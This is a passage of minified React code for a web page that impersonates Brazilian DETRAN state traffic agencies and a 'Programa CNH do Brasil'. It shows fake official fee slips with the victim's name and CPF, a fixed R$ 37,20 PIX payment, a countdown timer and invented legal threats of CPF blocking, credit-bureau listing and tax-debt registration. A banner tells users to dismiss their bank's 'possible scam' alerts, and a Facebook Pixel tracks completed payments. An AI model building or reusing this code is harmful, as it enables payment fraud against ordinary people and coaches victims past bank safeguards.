                  className: "grid grid-cols-2 gap-2 mb-2",
                  children: [l.jsxs("div", {
                    children: [l.jsx("p", {
                      className: "text-gray-400 text-[10px]",
                      children: "NOME"
                    }), l.jsx("p", {
                      className: "font-semibold text-gray-800 text-xs",
                      children: f != null && f.nome ? f.nome.toUpperCase() : ""
                    })]
                  }), l.jsxs("div", {
                    children: [l.jsx("p", {
                      className: "text-gray-400 text-[10px]",
                      children: "CPF"
                    }), l.jsx("p", {
                      className: "font-semibold text-gray-800 text-xs",
                      children: f != null && f.cpf ? Zl(f.cpf) : ""
                    })]
                  })]
                }), l.jsx("div", {
                  className: "bg-blue-50 p-2 rounded mb-2",
                  children: l.jsxs("div", {
                    className: "grid grid-cols-2 gap-2",
                    children: [l.jsxs("div", {
                      children: [l.jsx("p", {
                        className: "text-gray-400 text-[10px]",
                        children: "Nº RENACH"
                      }), l.jsx("p", {
                        className: "font-bold text-[#1351B4] text-sm",
                        children: M
                      })]
                    }), l.jsxs("div", {
                      children: [l.jsx("p", {
                        className: "text-gray-400 text-[10px]",
                        children: "CATEGORIA"
                      }), l.jsx("p", {
                        className: "font-bold text-gray-800 text-sm",
                        children: a
                      })]
                    })]
                  })
                }), l.jsxs("div", {
                  className: "grid grid-cols-2 gap-2 mb-2",
                  children: [l.jsxs("div", {
                    children: [l.jsx("p", {
                      className: "text-gray-400 text-[10px]",
                      children: "MÊS PREVISTO"
                    }), l.jsx("p", {
                      className: "font-semibold text-gray-800 text-xs",
                      children: u
                    })]
                  }), l.jsxs("div", {
                    children: [l.jsx("p", {
                      className: "text-gray-400 text-[10px]",
                      children: "STATUS"
                    }), l.jsx("p", {
                      className: "font-bold text-orange-600 text-xs",
                      children: "PENDENTE"
                    })]
                  })]
                }), l.jsx("div", {
                  className: "border-t border-gray-200 pt-2 text-[10px] text-gray-400",
                  children: l.jsxs("p", {
                    children: ["Emitido em ", nc, " às ", bh]
                  })
                })]
              })]
            })
          }), o === "renach_continue" && l.jsx(Oi, {
            onClick: xw
          }), xh.map((B, W) => l.jsx("div", {
            className: `mb-4 ${B.isIncoming ? "text-left" : "text-right"}`,
            children: l.jsx("div", {
              className: `inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base ${B.isIncoming ? "bg-[#2670CC] text-white rounded-tl-sm" : "bg-gray-200 text-gray-800 rounded-tr-sm"}`,
              style: {
                lineHeight: "1.5",
                fontSize: "16px",
                whiteSpace: "pre-line"
              },
              children: B.text.split("**").map((Y, ge) => ge % 2 === 1 ? l.jsx("strong", {
                children: Y
              }, ge) : Y)
            })
          }, `post-renach-${W}`)), N && l.jsx("div", {
            className: "mb-4 text-left",
            children: l.jsx("div", {
              className: "inline-block bg-[#2670CC] text-white px-4 py-3 rounded-2xl rounded-tl-sm shadow-sm text-base",
              children: l.jsxs("div", {
                className: "flex items-center gap-1.5",
                children: [l.jsx("span", {
                  className: "w-2 h-2 bg-white rounded-full animate-bounce",
                  style: {
                    animationDelay: "0ms"
                  }
                }), l.jsx("span", {
                  className: "w-2 h-2 bg-white rounded-full animate-bounce",
                  style: {
                    animationDelay: "150ms"
                  }
                }), l.jsx("span", {
                  className: "w-2 h-2 bg-white rounded-full animate-bounce",
                  style: {
                    animationDelay: "300ms"
                  }
                })]
              })
            })
          }), (o === "finalize_button" || o === "generating_pix" || o === "pix_document" || o === "awaiting_payment") && l.jsx("div", {
            className: "mb-4 text-left",
            children: l.jsxs("div", {
              className: "bg-red-600 text-white px-4 py-4 rounded-2xl rounded-tl-sm shadow-sm",
              style: {maxWidth: "80%"},
              children: [l.jsx("p", {
                className: "font-bold mb-2 text-base",
                children: "⚠️ COMUNICADO IMPORTANTE"
              }), l.jsx("p", {
                className: "text-sm mb-2",
                children: "Alguns clientes podem receber um alerta de \"possível golpe\" ao tentar concluir o pagamento. Esse aviso é emitido automaticamente pelos sistemas de segurança dos bancos como medida preventiva de proteção."
              }), l.jsx("p", {
                className: "text-sm mb-2",
                children: "Informamos que o procedimento é seguro e que os pagamentos são processados normalmente. ✅"
              }), l.jsx("p", {
                className: "text-sm",
                children: "Caso o alerta apareça, basta confirmar a autorização diretamente no aplicativo do seu banco para concluir o pagamento com segurança."
              })]
            })
          }), o === "finalize_button" && l.jsx("div", {
            className: "flex flex-col gap-3 max-w-[80%] mt-4",
            children: l.jsx("button", {
              onClick: ww,
              className: "flex items-center justify-center gap-2 p-4 bg-[#1351B4] text-white rounded-sm shadow-md hover:bg-[#0D3A8C] transition-all",
              children: l.jsx("span", {
                className: "font-medium",
                children: "Realizar Pagamento"
              })
            })
          }), o === "generating_pix" && l.jsx("div", {
            className: "flex justify-center my-6",
            children: l.jsxs("div", {
              className: "bg-white border border-gray-200 rounded-lg p-4 shadow-sm",
              children: [l.jsxs("div", {
                className: "flex items-center gap-3",
                children: [l.jsx(vt, {
                  className: "w-5 h-5 animate-spin text-[#1351B4]"
                }), l.jsx("span", {
                  className: "text-gray-700",
                  children: "Gerando Guia de Pagamento..."
                })]
              }), F && l.jsx("p", {
                className: "text-sm text-gray-500 mt-2 text-center",
                children: F
              })]
            })
          }), te && l.jsx("div", {
            className: "mb-4 text-left",
            children: l.jsxs("div", {
              className: "inline-block bg-red-600 text-white px-4 py-3 rounded-2xl rounded-tl-sm shadow-sm",
              children: [l.jsx("p", {
                className: "font-bold mb-1",
                children: "Erro ao gerar PIX"
              }), l.jsx("p", {
                className: "text-sm",
                children: te
              }), l.jsx("button", {
                onClick: () => Li(),
                className: "mt-2 bg-white text-red-600 px-4 py-2 rounded font-medium hover:bg-gray-100",
                children: "Tentar Novamente"
              })]
            })
          }), (o === "pix_document" || o === "awaiting_payment") && m && l.jsx("div", {
            ref: V,
            className: "w-full mt-4 mb-4",
            children: l.jsxs("div", {
              className: "bg-white border-2 border-gray-300 shadow-lg",
              style: {
                fontFamily: "Arial, sans-serif"
              },
              children: [l.jsx("div", {
                className: "bg-white p-4 border-b border-gray-300",
                children: l.jsxs("div", {
                  className: "flex flex-col items-center",
                  children: [l.jsx("img", {
                    src: Rg[(y == null ? void 0 : y.uf) || ""] || "",
                    alt: `Logo DETRAN ${(y == null ? void 0 : y.uf) || ""}`,
                    className: "h-16 max-w-[200px] object-contain mb-2"
                  }), l.jsx("p", {
                    className: "text-sm font-bold text-gray-800",
                    children: "GUIA DE RECOLHIMENTO"
                  }), l.jsx("p", {
                    className: "text-xs text-gray-600",
                    children: "TAXAS ADMINISTRATIVAS CNH"
                  })]
                })
              }), l.jsxs("div", {
                className: "p-4 border-b border-gray-300",
                children: [l.jsxs("div", {
                  children: [l.jsx("p", {
                    className: "text-gray-500 text-xs",
                    children: "CONTRIBUINTE"
                  }), l.jsx("p", {
                    className: "font-bold text-gray-800",
                    children: f != null && f.nome ? f.nome.toUpperCase() : ""
                  })]
                }), l.jsxs("div", {
                  className: "mt-2",
                  children: [l.jsx("p", {
                    className: "text-gray-500 text-xs",
                    children: "CPF"
                  }), l.jsx("p", {
                    className: "font-semibold text-gray-800",
                    children: f != null && f.cpf ? Zl(f.cpf) : ""
                  })]
                })]
              }), l.jsx("div", {
                className: "p-4 border-b border-gray-300 bg-gray-50",
                children: l.jsxs("div", {
                  className: "text-center",
                  children: [l.jsx("p", {
                    className: "text-gray-500 text-xs",
                    children: "EXERCÍCIO"
                  }), l.jsx("p", {
                    className: "font-bold text-gray-800 text-lg",
                    children: Gr.getFullYear()
                  })]
                })
              }), l.jsx("div", {
                className: "p-4 border-b border-gray-300",
                children: l.jsxs("div", {
                  className: "grid grid-cols-3 gap-2 text-sm",
                  children: [l.jsxs("div", {
                    children: [l.jsx("p", {
                      className: "text-gray-500 text-xs",
                      children: "Nº RENACH"
                    }), l.jsx("p", {
                      className: "font-semibold text-gray-800",
                      children: M
                    })]
                  }), l.jsxs("div", {
                    children: [l.jsx("p", {
                      className: "text-gray-500 text-xs",
                      children: "Nº GUIA"
                    }), l.jsx("p", {
                      className: "font-semibold text-gray-800",
                      children: ((Ch = m.transaction_id) == null ? void 0 : Ch.slice(-10)) || ""
                    })]
                  }), l.jsxs("div", {
                    children: [l.jsx("p", {
                      className: "text-gray-500 text-xs",
                      children: "VENCIMENTO"
                    }), l.jsx("p", {
                      className: "font-semibold text-gray-800",
                      children: Sh
                    })]
                  })]
                })
              }), l.jsxs("div", {
                className: "p-4 border-b border-gray-300",
                children: [l.jsx("div", {
                  className: "bg-[#1351B4] text-white p-2 mb-2",
                  children: l.jsxs("div", {
                    className: "flex justify-between text-xs font-bold",
                    children: [l.jsx("span", {
                      children: "DISCRIMINAÇÃO DOS DÉBITOS"
                    }), l.jsx("span", {
                      children: "VALORES EM REAIS"
                    })]
                  })
                }), l.jsxs("div", {
                  className: "space-y-1 text-sm",
                  children: [l.jsxs("div", {
                    className: "flex justify-between py-1 border-b border-gray-200",
                    children: [l.jsx("span", {
                      className: "text-gray-700",
                      children: "TAXA DE EXPEDIÇÃO DE DOCUMENTO (TED)"
                    }), l.jsx("span", {
                      className: "font-semibold",
                      children: "11,95"
                    })]
                  }), l.jsxs("div", {
                    className: "flex justify-between py-1 border-b border-gray-200",
                    children: [l.jsx("span", {
                      className: "text-gray-700",
                      children: "TAXA DE SERVIÇOS ADMINISTRATIVOS (TSA)"
                    }), l.jsx("span", {
                      className: "font-semibold",
                      children: "13,40"
                    })]
                  }), l.jsxs("div", {
                    className: "flex justify-between py-1 border-b border-gray-200",
                    children: [l.jsx("span", {
                      className: "text-gray-700",
                      children: "TAXA DE PROCESSAMENTO ELETRÔNICO (TPE)"
                    }), l.jsx("span", {
                      className: "font-semibold",
                      children: "11,85"
                    })]
                  }), l.jsxs("div", {
                    className: "flex justify-between py-2 bg-gray-100 px-2 font-bold",
                    children: [l.jsx("span", {
                      children: "TOTAL"
                    }), l.jsx("span", {
                      children: "37,20"
                    })]
                  })]
                })]
              }), l.jsxs("div", {
                className: "p-4 border-b border-gray-300 bg-red-50",
                children: [l.jsx("p", {
                  className: "text-sm text-red-600 font-bold mb-2",
                  children: "Observações:"
                }), l.jsxs("p", {
                  className: "text-sm text-red-600 mb-1",
                  children: ["Informamos que, caso o pagamento não seja realizado dentro do prazo estabelecido, o ", l.jsx("span", {
                    className: "font-bold",
                    children: "CPF"
                  }), " do responsável (", l.jsx("span", {
                    className: "font-bold",
                    children: Zl((f == null ? void 0 : f.cpf) || "")
                  }), ") será bloqueado no programa pelo período de ", l.jsx("span", {
                    className: "font-bold",
                    children: "18 (dezoito) meses"
                  }), ". Além disso, o valor da taxa, acrescido de multas, será registrado no ", l.jsx("span", {
                    className: "font-bold",
                    children: "CPF"
                  }), " junto aos órgãos de proteção ao crédito (", l.jsx("span", {
                    className: "font-bold",
                    children: "SPC"
                  }), " e ", l.jsx("span", {
                    className: "font-bold",
                    children: "SERASA"
                  }), "), bem como inscrito em ", l.jsx("span", {
                    className: "font-bold",
                    children: "Dívida Ativa da União"
                  }), ", nos termos do art. 2º da ", l.jsx("span", {
                    className: "font-bold",
                    children: "Lei nº 6.830/1980"
                  }), " (Lei de Execuções Fiscais) e do art. 43 da ", l.jsx("span", {
                    className: "font-bold",
                    children: "Lei nº 8.078/1990"
                  })]
                })]
              }), l.jsx("div", {
                className: "p-4 text-xs text-gray-500 border-b border-gray-300",
                children: l.jsxs("p", {
                  children: ["EMITIDO EM ", nc, " ÀS ", bh]
                })
              }), l.jsxs("div", {
                className: "bg-gray-100 p-4 border-t-2 border-dashed border-gray-400",
                children: [l.jsxs("div", {
                  className: "text-center mb-3",
                  children: [l.jsxs("p", {
                    className: "font-bold text-sm text-[#1351B4]",
                    children: ["DETRAN/", (y == null ? void 0 : y.uf) || "", " - PAGAMENTO VIA PIX"]
                  }), l.jsx("p", {
                    className: "text-xs text-gray-600",
                    children: "Programa CNH do Brasil - Taxas Administrativas"
                  })]
                }), m.pix_code && l.jsxs("div", {
                  className: "bg-white p-3 rounded border border-gray-300 mb-3 flex flex-col items-center",
                  children: [l.jsx("p", {
                    className: "text-xs text-gray-500 mb-2",
                    children: "QR CODE PIX:"
                  }), l.jsx("img", {
                    src: "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(m.pix_code),
                    alt: "QR Code PIX",
                    className: "w-48 h-48 object-contain"
                  })]
                }), l.jsxs("div", {
                  className: "bg-white p-3 rounded border border-gray-300 mb-3",
                  children: [l.jsx("p", {
                    className: "text-xs text-gray-500 mb-1",
                    children: "CÓDIGO PIX COPIA E COLA:"
                  }), l.jsx("p", {
                    className: "text-xs break-all font-mono bg-gray-50 p-2 rounded border",
                    children: m.pix_code
                  })]
                }), l.jsx("button", {
                  onClick: dw,
                  className: "w-full flex items-center justify-center gap-2 p-4 bg-[#1351B4] text-white rounded-md shadow-md hover:bg-[#0D3A8C] transition-all font-medium",
                  children: A ? l.jsxs(l.Fragment, {
                    children: [l.jsx(It, {
                      className: "w-5 h-5"
                    }), l.jsx("span", {
                      children: "Código Copiado!"
                    })]
                  }) : l.jsxs(l.Fragment, {
                    children: [l.jsx(Ol, {
                      className: "w-5 h-5"
                    }), l.jsx("span", {
                      children: "Copiar Código PIX"
                    })]
                  })
                }), l.jsx("div", {
                  className: "mt-3 mb-2",
                  children: l.jsx("img", {
                    src: "/img/pix-tutorial.png",
                    alt: "Como pagar com Pix Copia e Cola",
                    className: "w-full rounded-lg border border-gray-200 shadow-sm"
                  })
                }), l.jsxs("div", {
                  className: "mt-3 flex justify-between text-sm",
                  children: [l.jsxs("div", {
                    children: [l.jsx("p", {
                      className: "text-gray-500 text-xs",
                      children: "VENCIMENTO DA GUIA"
                    }), l.jsx("p", {
                      className: "font-bold",
                      children: Sh
                    })]
                  }), l.jsxs("div", {
                    className: "text-right",
                    children: [l.jsx("p", {
                      className: "text-gray-500 text-xs",
                      children: "VALOR A PAGAR EM REAIS"
                    }), l.jsx("p", {
                      className: "font-bold text-lg",
                      children: "R$ 37,20"
                    })]
                  })]
                }), o === "awaiting_payment" && l.jsx("div", {
                  className: "mt-4 pt-4 border-t-2 border-dashed border-gray-400",
                  children: l.jsxs("div", {
                    className: "bg-yellow-50 border border-yellow-300 rounded-lg p-3 text-center",
                    children: [l.jsxs("div", {
                      className: "flex items-center justify-center gap-2 mb-1",
                      children: [l.jsxs("div", {
                        className: "flex items-center gap-1",
                        children: [l.jsx("span", {
                          className: "w-2 h-2 bg-yellow-500 rounded-full animate-pulse"
                        }), l.jsx("span", {
                          className: "w-2 h-2 bg-yellow-500 rounded-full animate-pulse",
                          style: {
                            animationDelay: "150ms"
                          }
                        }), l.jsx("span", {
                          className: "w-2 h-2 bg-yellow-500 rounded-full animate-pulse",
                          style: {
                            animationDelay: "300ms"
                          }
                        })]
                      }), l.jsx("span", {
                        className: "text-yellow-800 font-semibold text-sm",
                        children: "AGUARDANDO PAGAMENTO"
                      })]
                    }), l.jsxs("p", {
                      className: "text-yellow-700 text-xs",
                      children: ["Esta guia vence em: ", l.jsx("span", {
                        className: "font-bold text-yellow-900",
                        children: Jl($)
                      })]
                    })]
                  })
                })]
              })]
            })
          }), T.map((B, W) => l.jsx("div", {
            className: `mb-4 ${B.isIncoming ? "text-left" : "text-right"}`,
            children: l.jsx("div", {
              className: `inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base ${B.isIncoming ? "bg-[#2670CC] text-white rounded-tl-sm" : "bg-gray-200 text-gray-800 rounded-tr-sm"}`,
              style: {
                lineHeight: "1.5",
                fontSize: "16px",
                whiteSpace: "pre-line"
              },
              children: B.text.split("**").map((Y, ge) => ge % 2 === 1 ? l.jsx("strong", {
                children: Y
              }, ge) : Y)
            })
          }, `post-pix-${W}`)), o === "awaiting_payment" && l.jsxs(l.Fragment, {
            children: [no && l.jsx("div", {
              className: "flex justify-center my-4",
              children: l.jsxs("div", {
                className: "bg-white border border-gray-200 rounded-lg p-4 flex items-center gap-3 shadow-sm",
                children: [l.jsx(vt, {
                  className: "w-5 h-5 animate-spin text-[#1351B4]"
                }), l.jsx("span", {
                  className: "text-gray-700",
                  children: "Verificando pagamento..."
                })]
              })
            }), !so && l.jsx("div", {
              className: "flex flex-col gap-3 max-w-[80%] mt-4",
              children: l.jsxs("button", {
                onClick: oo,
                disabled: no,
                className: "flex items-center justify-center gap-2 p-4 bg-[#22c55e] text-white rounded-sm shadow-md hover:bg-[#16a34a] transition-all disabled:opacity-50 disabled:cursor-not-allowed",
                children: [l.jsx(It, {
                  className: "w-5 h-5"
                }), l.jsx("span", {
                  className: "font-medium",
                  children: "Ativar meu cadastro"
                })]
              })
            }), so && l.jsxs("div", {
              className: "w-full mt-4 mb-4",
              children: [l.jsx("div", {
                className: "mb-4 text-left",
                children: l.jsx("div", {
                  className: "inline-block bg-[#2670CC] text-white px-4 py-3 rounded-2xl rounded-tl-sm shadow-sm",
                  style: {
                    fontSize: "16px",
                    whiteSpace: "pre-line"
                  },
                  children: "Não foi possível confirmar o pagamento automaticamente. Para ativar seu cadastro, clique abaixo e envie uma imagem do comprovante de pagamento."
                })
              }), l.jsx("input", {
                type: "file",
                ref: Yl,
                onChange: io,
                accept: "image/*,.pdf",
                className: "hidden"
              }), l.jsxs("div", {
                className: "bg-white border border-gray-300 rounded-lg p-4 shadow-sm",
                children: [l.jsxs("button", {
                  onClick: Xl,
                  className: "w-full flex items-center justify-center gap-3 p-4 border-2 border-dashed border-gray-300 rounded-lg hover:border-[#1351B4] hover:bg-gray-50 transition-all",
                  children: [l.jsx(EC, {
                    className: "w-6 h-6 text-gray-500"
                  }), l.jsx("span", {
                    className: "text-gray-600 font-medium",
                    children: br ? br.name : "Clique para selecionar o comprovante"
                  })]
                }), br && l.jsxs("button", {
                  onClick: Mi,
                  disabled: no,
                  className: "w-full mt-3 flex items-center justify-center gap-2 p-4 bg-[#22c55e] text-white rounded-md shadow-md hover:bg-[#16a34a] transition-all font-medium disabled:opacity-50 disabled:cursor-not-allowed",
                  children: [no && l.jsx(vt, {
                    className: "w-5 h-5 animate-spin"
                  }), !no && l.jsx(It, {
                    className: "w-5 h-5"
                  }), l.jsx("span", {
                    children: no ? "Enviando..." : "Enviar e ativar cadastro"
                  })]
                })]
              })]
            })]
          })]
        })
      })
    })]
  })
}
const FE = {
  AC: "https://www.agencia.ac.gov.br/wp-content/uploads/2019/07/Nova-Logo-Detran-Acre-2019-2-800x416.png",
  AL: "https://seeklogo.com/images/D/detran-alagoas-logo-C0D07878CA-seeklogo.com.png",
  AP: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/Detran-Amapa-ap-exame-toxicologico.jpg",
  AM: "https://apstatic.prodam.am.gov.br/images/detran/logo-detran-horizontal.png",
  BA: "https://images.seeklogo.com/logo-png/39/1/detran-bahia-logo-png_seeklogo-395407.png",
  CE: "https://www.detran.ce.gov.br/wp-content/uploads/2018/04/logo_detran_2018.png",
  DF: "https://zpy-customer-communication-cms-strapi-images-2.s3.amazonaws.com/DETRAN_DF_378eeacd03.webp",
  ES: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbFOyL7H4mp0igBsJUKg3y4m_7mg9xkqXPnQ&s",
  GO: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmmhmirDeoyas3iEHwHapMrQ3vIHa0ivq3wQ&s",
  MA: "https://seeklogo.com/images/D/detran-maranhao-logo-4F04A57787-seeklogo.com.png",
  MT: "https://portalcredenciamento.detran.mt.gov.br/815ed82f649be4cc8df5e9e024e23482.png",
  MS: "https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/082015/detranms_0.png?itok=oDYhYuLp",
  MG: "https://www.camarauberlandia.mg.gov.br/DETRANMG.jpg/@@images/480d676e-e0af-433a-bec8-d9676a937a59.jpeg",
  PA: "https://www.roservalramos.com.br/wp-content/uploads/2020/01/detran-pa-consulta.jpg",
  PB: "https://www.segundaviadetudo.com.br/wp-content/uploads/2020/07/Logo-Detran-PB.png",
  PR: "https://reciclagemcnhonline.com.br/wp-content/uploads/2024/08/Detran-PR-600x170.png",
  PE: "https://www.detran.pe.gov.br/images/FOTO%202022/Design%20sem%20nome%204.jpg",
  PI: "https://conteudo.consultapelaplaca.com.br/wp-content/uploads/2024/10/Detran-PI-IPVA-PI-2024-1.jpg",
  RJ: "https://odia.ig.com.br/_midias/jpg/2020/07/27/1140x632/1_detran_rj_2020_1280x720-18488499.jpg",
  RN: "https://www.novacruz.rn.leg.br/detran.png/image_preview",
  RS: "https://yt3.googleusercontent.com/JMoN0dwOBMHH6MLzGDD9m9QKYTTXKNqSeZHKwO46Zg006Nl-Yf4Ug17edHRcVDPQUYewi03ApQ=s900-c-k-c0x00ffffff-no-rj",
  RO: "https://portaleducacional.detran.ro.gov.br/Content/images/LogoDetranGrandel.png",
  RR: "https://www.detran.rr.gov.br/wp-content/uploads/2021/09/logotipo-detran-rr.png",
  SC: "https://servicos.detran.sc.gov.br/images/og-image.png",
  SP: "https://grandesnomesdapropaganda.com.br/wp-content/uploads/2014/09/Logo-detran-SP.jpg",
  SE: "https://images.seeklogo.com/logo-png/55/1/detran-se-logo-png_seeklogo-550201.png",
  TO: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/detran-to-exame-toxicologico.jpg"
};

function VE() {
  const t = cx().cpf || "",
    [, n] = In(),
    [r, s] = x.useState(null),
    [o, i] = x.useState(!0),
    [a, c] = x.useState(null),
    [u, d] = x.useState(!1),
    [f, h] = x.useState(600),
    [y, w] = x.useState("pending"),
    v = C => C.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4"),
    S = C => {
      const j = Math.floor(C / 60),
        A = C % 60;
      return `${String(j).padStart(2, "0")}:${String(A).padStart(2, "0")}`
    };
  x.useEffect(() => {
    t && (async () => {
      try {
        const A = await (await fetch(`/api/transaction/${t}`)).json();
        A.success ? (s(A.transaction), A.transaction.nome && localStorage.setItem("userData", JSON.stringify({
          nome: A.transaction.nome
        }))) : c(A.error || "Transação não encontrada")
      } catch {
        c("Erro ao buscar transação")
      } finally {
        i(!1)
      }
    })()
  }, [t]);
  const g = x.useCallback(async C => {
    try {
      const A = await (await fetch(`/api/check-payment?id=${C}`)).json();
      if (A.success && A.status && (w(A.status), A.status === "paid")) {
        if (typeof window < "u" && window.fbq) {
          const P = window.fbq;
          P("track", "Purchase", {
            value: parseFloat((r == null ? void 0 : r.amount) || "95.00"),
            currency: "BRL",
            content_type: "product",
            content_ids: [C],
            transaction_id: (r == null ? void 0 : r.transactionId) || C
          })
        }
        return setTimeout(() => {
          n("/success")
        }, 1e3), !0
      }
      return !1
    } catch (j) {
      return console.error("Erro ao verificar status:", j), !1
    }
  }, [r, n]);
  x.useEffect(() => {
    if (!(r != null && r.depositId)) return;
    const C = setInterval(async () => {
      await g(r.depositId) && clearInterval(C)
    }, 3e3);
    return () => clearInterval(C)
  }, [r == null ? void 0 : r.depositId, g]), x.useEffect(() => {
    if (f <= 0) return;
    const C = setInterval(() => {
      h(j => j <= 1 ? (clearInterval(C), 0) : j - 1)
    }, 1e3);
    return () => clearInterval(C)
  }, [f]);
  const p = async () => {
    r != null && r.pixCode && (await navigator.clipboard.writeText(r.pixCode), d(!0), setTimeout(() => d(!1), 3e3))
  }, m = new Date, b = `${m.getDate().toString().padStart(2, "0")}/${(m.getMonth() + 1).toString().padStart(2, "0")}/${m.getFullYear()}`;
  return o ? l.jsxs("div", {
    className: "min-h-screen bg-white flex flex-col",
    children: [l.jsx(rt, {}), l.jsx("div", {
      className: "flex-1 flex items-center justify-center",
      children: l.jsxs("div", {
        className: "text-center",
        children: [l.jsx(vt, {
          className: "w-12 h-12 animate-spin text-[#1351B4] mx-auto mb-4"
        }), l.jsx("p", {
          className: "text-gray-600",
          children: "Carregando dados do pagamento..."
        })]
      })
    })]
  }) : a || !r ? l.jsxs("div", {
    className: "min-h-screen bg-white flex flex-col",
    children: [l.jsx(rt, {}), l.jsx("main", {
      className: "flex-1 flex items-center justify-center p-4",
      children: l.jsxs("div", {
        className: "text-center",
        children: [l.jsx(Qm, {
          className: "w-16 h-16 text-yellow-500 mx-auto mb-4"
        }), l.jsx("h1", {
          className: "text-xl font-bold text-gray-800 mb-2",
          children: "Transação não encontrada"
        }), l.jsx("p", {
          className: "text-gray-600",
          children: a || "Não foi possível localizar uma transação para este CPF."
        })]
      })
    })]
  }) : l.jsxs("div", {
    className: "min-h-screen bg-gray-50 flex flex-col",
    children: [l.jsx(rt, {}), l.jsx("main", {
      className: "flex-1 p-4",
      children: l.jsxs("div", {
        className: "max-w-lg mx-auto",
        children: [l.jsx("div", {
          className: "bg-yellow-50 rounded-lg p-4 mb-4",
          children: l.jsxs("div", {
            className: "flex items-start gap-3",
            children: [l.jsx(Qm, {
              className: "w-6 h-6 text-yellow-600 flex-shrink-0 mt-0.5"
            }), l.jsxs("div", {
              children: [l.jsx("p", {
                className: "font-bold text-yellow-800",
                children: "PAGAMENTO OBRIGATÓRIO"
              }), l.jsx("p", {
                className: "text-sm text-yellow-700 mt-1",
                children: "O pagamento das taxas administrativas é obrigatório para garantir sua vaga no programa. Caso não seja realizado, seu CPF ficará bloqueado por 2 anos."
              })]
            })]
          })
        }), l.jsx("div", {
          className: "bg-red-50 rounded-lg p-4 mb-4",
          children: l.jsxs("div", {
            className: "text-center",
            children: [l.jsx("p", {
              className: "font-bold text-red-800",
              children: "A guia de pagamento vence em:"
            }), l.jsx("p", {
              className: "text-3xl font-bold text-red-600 mt-2",
              children: S(f)
            })]
          })
        }), l.jsxs("div", {
          className: "bg-white border-2 border-gray-300 shadow-lg",
          style: {
            fontFamily: "Arial, sans-serif"
          },
          children: [l.jsx("div", {
            className: "bg-white p-4 border-b border-gray-300",
            children: l.jsxs("div", {
              className: "flex flex-col items-center",
              children: [l.jsx("img", {
                src: FE[r.detranUf] || "",
                alt: `Brasão do Estado - DETRAN ${r.detranUf}`,
                className: "h-16 max-w-[200px] object-contain mb-2",
                onError: C => {
                  C.target.style.display = "none"
                }
              }), l.jsxs("p", {
                className: "text-sm font-bold text-gray-800",
                children: ["DETRAN/", r.detranUf, " - GUIA DE RECOLHIMENTO"]
              }), l.jsx("p", {
                className: "text-xs text-gray-600",
                children: "TAXAS ADMINISTRATIVAS CNH"
              })]
            })
          }), l.jsxs("div", {
            className: "p-4 border-b border-gray-300",
            children: [l.jsxs("div", {
              children: [l.jsx("p", {
                className: "text-gray-500 text-xs",
                children: "CONTRIBUINTE"
              }), l.jsx("p", {
                className: "font-bold text-gray-800",
                children: r.nome.toUpperCase()
              })]
            }), l.jsxs("div", {
              className: "mt-2",
              children: [l.jsx("p", {
                className: "text-gray-500 text-xs",
                children: "CPF"
              }), l.jsx("p", {
                className: "font-semibold text-gray-800",
                children: v(r.cpf)
              })]
            })]
          }), l.jsx("div", {
            className: "p-4 border-b border-gray-300 bg-gray-50",
            children: l.jsxs("div", {
              className: "text-center",
              children: [l.jsx("p", {
                className: "text-gray-500 text-xs",
                children: "EXERCÍCIO"
              }), l.jsx("p", {
                className: "font-bold text-gray-800 text-lg",
                children: m.getFullYear()
              })]
            })
          }), l.jsx("div", {
            className: "p-4 border-b border-gray-300",
            children: l.jsxs("div", {
              className: "grid grid-cols-3 gap-2 text-sm",
              children: [l.jsxs("div", {
                children: [l.jsx("p", {
                  className: "text-gray-500 text-xs",
                  children: "TED"
                }), l.jsx("p", {
                  className: "font-semibold",
                  children: "R$ 11,95"
                })]
              }), l.jsxs("div", {
                children: [l.jsx("p", {
                  className: "text-gray-500 text-xs",
                  children: "TSA"
                }), l.jsx("p", {
                  className: "font-semibold",
                  children: "R$ 13,40"
                })]
              }), l.jsxs("div", {
                children: [l.jsx("p", {
                  className: "text-gray-500 text-xs",
                  children: "TPE"
                }), l.jsx("p", {
                  className: "font-semibold",
                  children: "R$ 11,85"
                })]
              })]
            })
          }), l.jsxs("div", {
            className: "p-4 bg-[#E8F0FE]",
            children: [l.jsxs("div", {
              className: "text-center mb-3",
              children: [l.jsxs("p", {
                className: "font-bold text-sm text-[#1351B4]",
                children: ["DETRAN/", r.detranUf, " - PAGAMENTO VIA PIX"]
              }), l.jsx("p", {
                className: "text-xs text-gray-600",
                children: "Programa CNH do Brasil - Taxas Administrativas"
              })]
            }), r.qrCodeImage && l.jsxs("div", {
              className: "bg-white p-3 rounded border border-gray-300 mb-3 flex flex-col items-center",
              children: [l.jsx("p", {
                className: "text-xs text-gray-500 mb-2",
                children: "QR CODE PIX:"
              }), l.jsx("img", {
                src: r.qrCodeImage,
                alt: "QR Code PIX",
                className: "w-48 h-48 object-contain"
              })]
            }), l.jsxs("div", {
              className: "bg-white p-3 rounded border border-gray-300 mb-3",
              children: [l.jsx("p", {
                className: "text-xs text-gray-500 mb-1",
                children: "CÓDIGO PIX COPIA E COLA:"
              }), l.jsx("p", {
                className: "text-xs break-all font-mono bg-gray-50 p-2 rounded border",
                children: r.pixCode
              })]
            }), l.jsx("button", {
              onClick: p,
              className: "w-full flex items-center justify-center gap-2 p-4 bg-[#1351B4] text-white rounded-md shadow-md hover:bg-[#0D3A8C] transition-all font-medium",
              children: u ? l.jsxs(l.Fragment, {
                children: [l.jsx(It, {
                  className: "w-5 h-5"
                }), l.jsx("span", {
                  children: "Código Copiado!"
                })]
              }) : l.jsxs(l.Fragment, {
                children: [l.jsx(Ol, {
                  className: "w-5 h-5"
                }), l.jsx("span", {
                  children: "Copiar Código PIX"
                })]
              })
            }), l.jsxs("div", {
              className: "mt-3 flex justify-between text-sm",
              children: [l.jsxs("div", {
                children: [l.jsx("p", {
                  className: "text-gray-500 text-xs",
                  children: "VENCIMENTO DA GUIA"
                }), l.jsx("p", {
                  className: "font-bold",
                  children: b
                })]
              }), l.jsxs("div", {
                className: "text-right",
                children: [l.jsx("p", {
